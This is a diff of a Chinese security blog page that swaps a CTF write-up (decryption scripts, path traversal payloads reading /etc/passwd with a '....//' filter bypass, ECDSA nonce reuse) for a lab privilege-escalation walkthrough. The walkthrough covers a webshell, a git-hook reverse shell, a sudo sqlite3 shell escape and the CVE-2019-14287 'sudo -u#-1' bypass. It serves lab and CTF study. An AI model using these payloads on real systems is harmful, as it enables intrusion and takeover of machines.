class="number">0x4B</span>, <span class="number">0x3D</span>, <span class="number">0x32</span>, <span class="number">0x42</span>, <span class="number">0x55</span>, <span class="number">0x2D</span>, <span class="number">0x4F</span>, <span class="number">0xF9</span>, <span class="number">0x77</span>, <span class="number">0x1B</span>, <span class="number">0x74</span>,</span><br><span class="line">         <span class="number">0x1F</span>, <span class="number">0x71</span>, <span class="number">0x7B</span>, <span class="number">0x9D</span>, <span class="number">0x73</span>, <span class="number">0xC4</span>, <span class="number">0xAB</span>, <span class="number">0xD0</span>, <span class="number">0xF3</span>, <span class="number">0xC1</span>, <span class="number">0x88</span>, <span class="number">0x07</span>, <span class="number">0xDC</span>, <span class="number">0xCE</span>, <span class="number">0xEF</span>, <span class="number">0xC0</span>,</span><br><span class="line">         <span class="number">0x72</span>, <span class="number">0x4A</span>, <span class="number">0x27</span>, <span class="number">0x81</span>, <span class="number">0x9B</span>, <span class="number">0xEE</span>, <span class="number">0xC7</span>, <span class="number">0x28</span>, <span class="number">0x26</span>, <span class="number">0x5A</span>, <span class="number">0x94</span>, <span class="number">0x54</span>, <span class="number">0x70</span>, <span class="number">0xD1</span>, <span class="number">0xE9</span>, <span class="number">0xC8</span>,</span><br><span class="line">         <span class="number">0x98</span>, <span class="number">0x36</span>, <span class="number">0x91</span>, <span class="number">0x41</span>, <span class="number">0xB8</span>, <span class="number">0x3A</span>, <span class="number">0x79</span>, <span class="number">0x0A</span>, <span class="number">0x08</span>, <span class="number">0xE5</span>, <span class="number">0xAF</span>, <span class="number">0x80</span>, <span class="number">0x24</span>, <span class="number">0xAE</span>, <span class="number">0x00</span>, <span class="number">0x19</span>,</span><br><span class="line">         <span class="number">0xCC</span>, <span class="number">0x7A</span>, <span class="number">0xF7</span>, <span class="number">0x51</span>, <span class="number">0x7D</span>, <span class="number">0x69</span>, <span class="number">0xEC</span>, <span class="number">0x03</span>, <span class="number">0x65</span>, <span class="number">0x25</span>, <span class="number">0x1C</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0xE6</span>, <span class="number">0xBD</span>, <span class="number">0xD9</span>,</span><br><span class="line">         <span class="number">0x59</span>, <span class="number">0xFE</span>, <span class="number">0x92</span>, <span class="number">0xB0</span>, <span class="number">0x10</span>, <span class="number">0x6F</span>, <span class="number">0xF0</span>, <span class="number">0xE3</span>, <span class="number">0x9F</span>, <span class="number">0xAD</span>, <span class="number">0x84</span>, <span class="number">0xF4</span>, <span class="number">0xA5</span>, <span class="number">0x33</span>, <span class="number">0x35</span>, <span class="number">0x48</span>,</span><br><span class="line">         <span class="number">0x53</span>, <span class="number">0xB1</span>, <span class="number">0xE0</span>, <span class="number">0xD8</span>, <span class="number">0x05</span>, <span class="number">0x38</span>, <span class="number">0x18</span>, <span class="number">0x68</span>, <span class="number">0xA9</span>, <span class="number">0x14</span>, <span class="number">0xC6</span>, <span class="number">0x3F</span>, <span class="number">0x61</span>, <span class="number">0x8A</span>, <span class="number">0x31</span>, <span class="number">0x3B</span>,</span><br><span class="line">         <span class="number">0xBA</span>, <span class="number">0x2B</span>, <span class="number">0x4E</span>, <span class="number">0xE2</span>, <span class="number">0x57</span>, <span class="number">0x9A</span>, <span class="number">0xF1</span>, <span class="number">0xEA</span>, <span class="number">0x64</span>, <span class="number">0x7E</span>, <span class="number">0xA0</span>, <span class="number">0x93</span>, <span class="number">0xB6</span>, <span class="number">0xDA</span>, <span class="number">0x60</span>, <span class="number">0x2E</span>,</span><br><span class="line">         <span class="number">0x1D</span>, <span class="number">0x5B</span>, <span class="number">0x82</span>, <span class="number">0x34</span>, <span class="number">0x6D</span>, <span class="number">0xFC</span>, <span class="number">0xCF</span>, <span class="number">0x7F</span>, <span class="number">0xE7</span>, <span class="number">0x96</span>, <span class="number">0x67</span>, <span class="number">0x43</span>, <span class="number">0x06</span>, <span class="number">0x44</span>, <span class="number">0xC9</span>, <span class="number">0x4C</span>,</span><br><span class="line">         <span class="number">0x40</span>, <span class="number">0xDB</span>, <span class="number">0xFD</span>, <span class="number">0x4D</span>, <span class="number">0xB5</span>, <span class="number">0xED</span>, <span class="number">0x39</span>, <span class="number">0x2C</span>, <span class="number">0xB3</span>, <span class="number">0x17</span>, <span class="number">0x9E</span>, <span class="number">0xCD</span>, <span class="number">0xFA</span>, <span class="number">0x6B</span>, <span class="number">0xCA</span>, <span class="number">0x87</span>,</span><br><span class="line">         <span class="number">0x8F</span>, <span class="number">0x9C</span>, <span class="number">0x89</span>, <span class="number">0x0E</span>, <span class="number">0x63</span>, <span class="number">0x45</span>, <span class="number">0x86</span>, <span class="number">0xAA</span>, <span class="number">0x5E</span>, <span class="number">0x95</span>, <span class="number">0x16</span>, <span class="number">0xC5</span>, <span class="number">0xD5</span>, <span class="number">0x2F</span>, <span class="number">0xA1</span>, <span class="number">0xF8</span>,</span><br><span class="line">         <span class="number">0x99</span>, <span class="number">0xFF</span>, <span class="number">0x3C</span>, <span class="number">0x0D</span>, <span class="number">0x3E</span>, <span class="number">0xD4</span>, <span class="number">0x04</span>, <span class="number">0x76</span>, <span class="number">0xD7</span>, <span class="number">0x47</span>, <span class="number">0x20</span>, <span class="number">0x8D</span>, <span class="number">0xDF</span>, <span class="number">0x5C</span>, <span class="number">0x7C</span>, <span class="number">0xA3</span>,</span><br><span class="line">         <span class="number">0x1E</span>, <span class="number">0x8B</span>, <span class="number">0x15</span>, <span class="number">0xB9</span>, <span class="number">0xA8</span>, <span class="number">0xCB</span>, <span class="number">0x22</span>, <span class="number">0xA6</span>, <span class="number">0x52</span>, <span class="number">0xD6</span>, <span class="number">0xFB</span>, <span class="number">0x5D</span>, <span class="number">0xDD</span>, <span class="number">0xB2</span>, <span class="number">0x6E</span>, <span class="number">0xE8</span>,</span><br><span class="line">         <span class="number">0xF2</span>, <span class="number">0xE1</span>, <span class="number">0x2A</span>, <span class="number">0x58</span>, <span class="number">0x62</span>, <span class="number">0x12</span>, <span class="number">0x11</span>, <span class="number">0x50</span>, <span class="number">0x75</span>, <span class="number">0xB7</span>, <span class="number">0xAC</span>, <span class="number">0x90</span>, <span class="number">0x0B</span>, <span class="number">0x85</span>, <span class="number">0x02</span>, <span class="number">0xBE</span>]</span><br><span class="line"></span><br><span class="line">key = [<span class="number">0xB9</span>, <span class="number">0xCD</span>, <span class="number">0xCE</span>, <span class="number">0x30</span>, <span class="number">0xB8</span>, <span class="number">0x61</span>, <span class="number">0x4E</span>, <span class="number">0xAA</span>]</span><br><span class="line">target = [<span class="number">0xA3</span>, <span class="number">0x5B</span>, <span class="number">0x4C</span>, <span class="number">0x0A</span>, <span class="number">0x0E</span>, <span class="number">0x98</span>, <span class="number">0x4F</span>, <span class="number">0xF8</span>, <span class="number">0x14</span>, <span class="number">0x90</span>, <span class="number">0xAC</span>, <span class="number">0xF6</span>, <span class="number">0x14</span>, <span class="number">0x41</span>, <span class="number">0x9F</span>, <span class="number">0x95</span>,</span><br><span class="line">          <span class="number">0x5C</span>, <span class="number">0x02</span>, <span class="number">0x50</span>, <span class="number">0x97</span>, <span class="number">0x61</span>, <span class="number">0xC2</span>, <span class="number">0x9F</span>, <span class="number">0x4E</span>, <span class="number">0x61</span>, <span class="number">0x02</span>, <span class="number">0x11</span>, <span class="number">0x3A</span>, <span class="number">0x20</span>, <span class="number">0x97</span>, <span class="number">0x42</span>, <span class="number">0xC5</span>,</span><br><span class="line">          <span class="number">0x8A</span>, <span class="number">0x96</span>, <span class="number">0xAC</span>, <span class="number">0x83</span>, <span class="number">0x3B</span>, <span class="number">0x6C</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 构建逆映射表</span></span><br><span class="line">inv = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line"><span class="keyword">for</span> i, v <span class="keyword">in</span> <span class="built_in">enumerate</span>(table):</span><br><span class="line">    inv[v] = i</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(target)):</span><br><span class="line">    flag += <span class="built_in">chr</span>(inv[target[i]] ^ key[i % <span class="number">8</span>])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p>随后成功登录进入后台。</p>
+<p>获取webshell方式如下图：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/03/NewStar-CTF-2025%E5%A4%8D%E7%8E%B0/967.png"
+                     
+                ></p>
+<p>接着访问webshell地址，成功获取webshell</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/03/NewStar-CTF-2025%E5%A4%8D%E7%8E%B0/596.png"
+                     
+                ></p>
+<p>在网站源码中找到8585端口数据库账号密码</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/03/NewStar-CTF-2025%E5%A4%8D%E7%8E%B0/184.png"
+                     
+                ></p>
+<p>和前面一样，密码被加密了，有以下思路：</p>
+<blockquote>
+<p>思路1：找源码，找加密方式<br>思路2：换加密方式</p>
+</blockquote>
+<p>使用思路2，如下图：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/03/NewStar-CTF-2025%E5%A4%8D%E7%8E%B0/701.png"
+                     
+                ></p>
+<p>随后登录成功，不过平时最好还是用思路1,思路1很多情况不适用。</p>
+<p>随后便是拿webshell</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/03/NewStar-CTF-2025%E5%A4%8D%E7%8E%B0/076.png"
+                     
+                ></p>
+<p>写入执行反弹shell，保存后，随便修改一个源文件，命令便会执行。</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/03/NewStar-CTF-2025%E5%A4%8D%E7%8E%B0/391.png"
+                     
+                ></p>
+<p>成功收到。</p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br></pre></td></tr></table></figure></div>
 
-<p><strong>逆向原理：</strong> <code>table[input[i] ^ key[i % 8]] == target[i]</code>，因此 <code>input[i] ^ key[i % 8] == inv[target[i]]</code>，即 <code>input[i] == inv[target[i]] ^ key[i % 8]</code>，其中 <code>inv</code> 是 <code>table</code> 的逆映射。</p>
-<hr>
-<h2 id="四、pyc-逆向-Base64-XOR"><a href="#四、pyc-逆向-Base64-XOR" class="headerlink" title="四、pyc 逆向 + Base64 + XOR"></a>四、pyc 逆向 + Base64 + XOR</h2><h3 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
-<li><p>题目给了一个 Python 编译文件（<code>.pyc</code>），先使用 <code>file</code> 命令查看版本信息。</p>
-</li>
-<li><p>接着使用 <code>strings</code> 提取可用字符串，可以看到关键信息如 <code>b64decode</code>、<code>base64</code>、<code>xor_key</code> 等，判断加密过程使用了 Base64 编码以及 XOR。</p>
-</li>
-<li><p>编写脚本读取 pyc 字节码信息，提取出：</p>
-<ul>
-<li><code>encoded_flag = &#39;NT8yNCgjYz0hJCllY34lJzRhfiEnOzx+JWQrPX4xJ2FkJTg6KT1hNT8u&#39;</code></li>
-<li><code>xor_key = 83</code></li>
-</ul>
-</li>
-<li><p>通过 <code>strings</code> 中的信息，可知原始加密流程为：<code>Base64 编码 → XOR → chr()</code>。</p>
-</li>
-<li><p><strong>解密脚本：</strong></p>
-</li>
-</ol>
-<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">s = <span class="string">&quot;NT8yNCgjYz0hJCllY34lJzRhfiEnOzx+JWQrPX4xJ2FkJTg6KT1hNT8u&quot;</span></span><br><span class="line">key = <span class="number">83</span></span><br><span class="line"></span><br><span class="line">data = base64.b64decode(s)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span>.join(<span class="built_in">chr</span>(x ^ key) <span class="keyword">for</span> x <span class="keyword">in</span> data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>
+<p>查看当前用户可以使用sudo执行哪些命令。</p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">frank@devguru:~/gitea-repositories/frank/devguru-website.git$ sudo -l</span><br><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for frank on devguru:</span><br><span class="line">    env_reset, mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User frank may run the following commands on devguru:</span><br><span class="line">    (ALL, !root) NOPASSWD: /usr/bin/sqlite3</span><br></pre></td></tr></table></figure></div>
 
-<p><strong>原理：</strong> 逆向操作——先 Base64 解码，再逐字节与 key 异或，恢复原始 flag。</p>
-<hr>
-<h2 id="五、目录穿越（Path-Traversal）"><a href="#五、目录穿越（Path-Traversal）" class="headerlink" title="五、目录穿越（Path Traversal）"></a>五、目录穿越（Path Traversal）</h2><h3 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h3><p>从题目可知是目录穿越漏洞。</p>
-<p><strong>Payload 尝试：</strong></p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">../../../flag</span><br><span class="line">../../../etc/passwd</span><br></pre></td></tr></table></figure></div>
+<p>使用这个<code>/usr/bin/sqlite3</code></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/03/NewStar-CTF-2025%E5%A4%8D%E7%8E%B0/989.png"
+                     
+                ></p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sqlite3 /dev/null &#x27;.shell /bin/sh&#x27;</span><br></pre></td></tr></table></figure></div>
 
-<p>回显表明过滤了 <code>../</code>。</p>
-<p><strong>绕过方法：</strong> 尝试双写绕过。</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">....//....//....//etc/passwd</span><br></pre></td></tr></table></figure></div>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">frank@devguru:~/gitea-repositories/frank/devguru-website.git$ sudo sqlite3 /dev/null &#x27;.shell /bin/sh&#x27;</span><br><span class="line">&lt;ebsite.git$ sudo sqlite3 /dev/null &#x27;.shell /bin/sh&#x27;          </span><br><span class="line">sudo: no tty present and no askpass program specified</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
 
-<p>回显成功读取 <code>/etc/passwd</code>。</p>
-<p>接着读 flag：</p>
-<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">....//....//....//flag</span><br></pre></td></tr></table></figure></div>
+<p>no tty，没有终端，但这里创建终端也不行，这里是版本问题，需要利用sudo本身版本漏洞。</p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -V</span><br></pre></td></tr></table></figure></div>
 
-<p><strong>原理：</strong> 服务端过滤了 <code>../</code> 字符串，但使用双写 <code>....//</code> 方式绕过——当服务端将 <code>../</code> 替换为空时，<code>....//</code> 中间的 <code>../</code> 被删除后，剩余的字符拼接为 <code>../</code>，从而实现目录穿越。</p>
-<hr>
-<h2 id="六、ECDSA-Nonce-Reuse"><a href="#六、ECDSA-Nonce-Reuse" class="headerlink" title="六、ECDSA Nonce Reuse"></a>六、ECDSA Nonce Reuse</h2><h3 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h3><p>题目涉及 ECDSA 签名中 nonce（随机数 <code>k</code>）重用漏洞。</p>
-<p>当 ECDSA 签名中使用相同的 nonce <code>k</code> 对不同的消息进行签名时，可以通过两组签名值恢复私钥。</p>
-<h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag&#123;ecdsa_nonce_reuse_a46b8f59aac5f0d5f1e661827c1cf3a7&#125;</span><br></pre></td></tr></table></figure></div>
+<p>可查看sudo版本</p>
+<blockquote>
+<p>sudo -V<br>Sudo version 1.8.21p2<br>Sudoers policy plugin version 1.8.21p2<br>Sudoers file grammar version 46<br>Sudoers I&#x2F;O plugin version 1.8.21p2</p>
+</blockquote>
+<p>使用CVE-2019-14287</p>
+<div class="code-container" data-rel="Shell"><figure class="iseeu highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo -u#-1 sqlite3 /dev/null &#x27;.shell /bin/sh&#x27;</span><br></pre></td></tr></table></figure></div>
 
-<p><strong>原理：</strong> ECDSA 签名中，若两次签名使用相同的 k 值，则：</p>
-<p>$$<br>\begin{aligned}<br>s_1 &amp;&#x3D; k^{-1}(z_1 + r \cdot d_A) \bmod n \<br>s_2 &amp;&#x3D; k^{-1}(z_2 + r \cdot d_A) \bmod n<br>\end{aligned}<br>$$</p>
-<p>两式相减可消去私钥 $d_A$ 求出 $k$，进而恢复私钥：</p>
-<p>$$<br>k &#x3D; \frac{z_1 - z_2}{s_1 - s_2} \bmod n<br>$$</p>
-<p>$$<br>d_A &#x3D; \frac{s_1 \cdot k - z_1}{r} \bmod n<br>$$</p>
+<p>提权成功</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/2025/12/03/NewStar-CTF-2025%E5%A4%8D%E7%8E%B0/871.png"
+                     
+                ></p>
 
 		</div>
 
@@ -832,18 +960,18 @@
 		<div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
 			<div class="article-copyright-info-container">
     <ul>
-        <li><strong>标题:</strong> 第十届御网杯网络安全大赛wp</li>
+        <li><strong>标题:</strong> 一些提权学习(2)</li>
         <li><strong>作者:</strong> xhxbb</li>
         <li><strong>创建于
-                :</strong> 2026-05-31 12:47:46</li>
+                :</strong> 2026-07-25 11:32:08</li>
         
             <li>
                 <strong>更新于
-                    :</strong> 2026-07-24 17:22:34
+                    :</strong> 2026-07-26 20:56:03
             </li>
         
         <li>
-            <strong>链接:</strong> https://xhxbb1.github.io/2026/05/31/第十届御网杯网络安全大赛wp/
+            <strong>链接:</strong> https://xhxbb1.github.io/2026/07/25/一些提权学习-2/
         </li>
         <li>
             <strong>
@@ -865,7 +993,7 @@
 		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
 			
 			<li class="tag-item mx-0.5">
-				<a href="/tags/wp/">#wp</a>&nbsp;
+				<a href="/tags/%E6%8F%90%E6%9D%83/">#提权</a>&nbsp;
 			</li>
 			
 		</ul>
@@ -876,23 +1004,11 @@
 		
 		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
 			
-			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="prev" rel="prev" href="/2026/07/23/%E4%B8%80%E4%BA%9B%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/">
-					<span class="left arrow-icon flex justify-center items-center">
-						<i class="fa-solid fa-chevron-left"></i>
-					</span>
-					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item truncate max-w-48">一些提权学习</span>
-						<span class="post-nav-item">上一篇</span>
-					</span>
-				</a>
-			</div>
-			
 			
 			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
-				<a class="next" rel="next" href="/2025/12/03/NewStar-CTF-2025%E5%A4%8D%E7%8E%B0/">
+				<a class="next" rel="next" href="/2026/07/23/%E4%B8%80%E4%BA%9B%E6%8F%90%E6%9D%83%E5%AD%A6%E4%B9%A0/">
 					<span class="title flex justify-center items-center">
-						<span class="post-nav-title-item truncate max-w-48">NewStar CTF 2025复现</span>
+						<span class="post-nav-title-item truncate max-w-48">一些提权学习</span>
 						<span class="post-nav-item">下一篇</span>
 					</span>
 					<span class="right arrow-icon flex justify-center items-center">
@@ -967,8 +1083,8 @@
 		<div class="post-toc-wrap">
 	<div class="post-toc">
 		<div class="toc-title">目录</div>
-		<div class="page-title">第十届御网杯网络安全大赛wp</div>
-		<ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81Babyrsa"><span class="nav-text">一、Babyrsa</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%A2%98%E7%9B%AE%E6%88%AA%E5%9B%BE"><span class="nav-text">题目截图</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF"><span class="nav-text">解题思路</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81ScatterRSA"><span class="nav-text">二、ScatterRSA</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-1"><span class="nav-text">解题思路</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81Rerere"><span class="nav-text">三、Rerere</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-2"><span class="nav-text">解题思路</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81pyc-%E9%80%86%E5%90%91-Base64-XOR"><span class="nav-text">四、pyc 逆向 + Base64 + XOR</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-3"><span class="nav-text">解题思路</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81%E7%9B%AE%E5%BD%95%E7%A9%BF%E8%B6%8A%EF%BC%88Path-Traversal%EF%BC%89"><span class="nav-text">五、目录穿越（Path Traversal）</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-4"><span class="nav-text">解题思路</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81ECDSA-Nonce-Reuse"><span class="nav-text">六、ECDSA Nonce Reuse</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF-5"><span class="nav-text">解题思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Flag"><span class="nav-text">Flag</span></a></li></ol></li></ol>
+		<div class="page-title">一些提权学习(2)</div>
+		<ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#SUID"><span class="nav-text">SUID</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E4%B8%80%EF%BC%88suid%E5%85%A5%E9%97%A8%EF%BC%89"><span class="nav-text">靶机一（suid入门）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E4%BA%8C%EF%BC%88suid%E8%BF%9B%E9%98%B6%EF%BC%89"><span class="nav-text">靶机二（suid进阶）</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#SUDO"><span class="nav-text">SUDO</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E9%9D%B6%E6%9C%BA%E4%B8%89%EF%BC%88sudo-CVE%EF%BC%89"><span class="nav-text">靶机三（sudo&amp;CVE）</span></a></li></ol>
 
 	</div>
 </div>
